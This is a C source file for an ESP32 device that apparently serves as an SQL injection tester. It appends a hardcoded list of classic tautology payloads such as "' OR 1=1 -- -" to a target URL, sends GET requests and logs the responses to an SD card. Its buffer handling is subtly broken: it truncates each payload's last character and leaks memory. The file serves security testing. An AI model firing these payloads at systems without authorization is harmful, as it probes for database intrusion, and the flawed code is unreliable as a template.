#include "sql_injection.h"
char *payloads[] = {"' OR 1=1 -- -", "'", "\"", "' OR 1=1 #", "' OR 1=1 --"};
#define DELAY(ms) vTaskDelay(pdMS_TO_TICKS(ms))
#define MAX_HTTP_OUTPUT_BUFFER 8192
#define CHUNK_SIZE 100
#define MAX_COOKIE_NUM 5
#define MAX_COOKIE_VALUE_LEN 50
#define MAX_COOKIE_KEY_LEN 50

static const char *TAG = "SQLI-tester";
/* Para escribir resultados en SD */
static char file_path[256];

/* Cliente y configuración */
static esp_http_client_handle_t httpClient_sql; 
static esp_http_client_config_t httpConfig = {
    .url = "",
    .disable_auto_redirect = false,
    .user_agent = "my-esp32-user-agent", 
};

/* Buffer para descarga de la respuesta */
static char outputBuffer[MAX_HTTP_OUTPUT_BUFFER] = {0};

static int get_request(){
    esp_err_t meth_err = esp_http_client_set_method(httpClient_sql, HTTP_METHOD_GET);
    if (meth_err == ESP_ERR_INVALID_ARG){
        ESP_LOGE(TAG, "Error definiendo el método");
        return -1;
    }
    esp_err_t err = esp_http_client_open(httpClient_sql, 0);
    if (err == ESP_FAIL){
        ESP_LOGE(TAG, "Ha fallado la conexión GET a la url especificada");
        return -1;
    }
    else if (err == ESP_OK){
        int contentLength = esp_http_client_fetch_headers(httpClient_sql);
        if (contentLength < 0){
            if (contentLength == ESP_FAIL){
                ESP_LOGE(TAG, "Ha fallado fetch_headers");
                return -1;
            }
            else{
                ESP_LOGE(TAG, "fetch_headers time out");
                return -1;
            }
        }
        else {
            int data_read = esp_http_client_read_response(httpClient_sql, outputBuffer, MAX_HTTP_OUTPUT_BUFFER);
            if (data_read >= 0){
                ESP_LOGI(TAG, "HTTP GET Status = %d, content_length = %"PRId64,
                    esp_http_client_get_status_code(httpClient_sql),
                    esp_http_client_get_content_length(httpClient_sql));
                /* Escribimos respuesta en SD para posterior análisis */
                sd_write_file(file_path, outputBuffer);
                sd_write_file(file_path, "\n");
                esp_http_client_close(httpClient_sql);
                return 0;
            }
        }
    }
    else{
        ESP_LOGE(TAG, "Error desconocido en la solicitud GET %i", err);
        return -1;
    }
    return -1;
}


char *url_encode(const char *str) {
    /* URL encodear un payload */
    char *enc = malloc(strlen(str) * 3 + 1);
    if (!enc) return NULL;
    char *penc = enc;
    while (*str) {
        if (isalnum((unsigned char)*str) || *str == '-' || *str == '_' || *str == '.' || *str == '~') {
            *penc++ = *str;
        } else {
            sprintf(penc, "%%%02X", (unsigned char)*str);
            penc += 3;
        }
        str++;
    }
    *penc = '\0';
    return enc;
}

void sql_injection_test(char* url){
    if (!connected_to_wifi){
        ESP_LOGE(TAG, "No hay conexión a internet");
    }
    else{
        char timestamp[64];
        get_timestamp(timestamp);
        snprintf(file_path, sizeof(file_path), "results/sql-injection/sql-%s.txt", timestamp);
        /* Probar lista de payloads */
        for (int i = 0 ; i < sizeof(payloads)/sizeof(char*); i++){
            char* url_enc_payload = url_encode(payloads[i]);
            int len = strlen(url) + strlen(url_enc_payload);
            char myurl[len];
            snprintf(myurl, len, "%s%s", url, url_enc_payload);
            httpConfig.url = myurl;
            httpClient_sql = esp_http_client_init(&httpConfig);
            char data[128];
            char timestamp[64];
            get_timestamp(timestamp);
            snprintf(data, sizeof(data), "[%s] payload: %s\n", timestamp, payloads[i]);
            sd_write_file(file_path, data);
            int get_err = get_request();
            //sd_write_file("sql-results.html", "TEST OK\n"); // QUITAR
            esp_http_client_cleanup(httpClient_sql);
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
    }
}

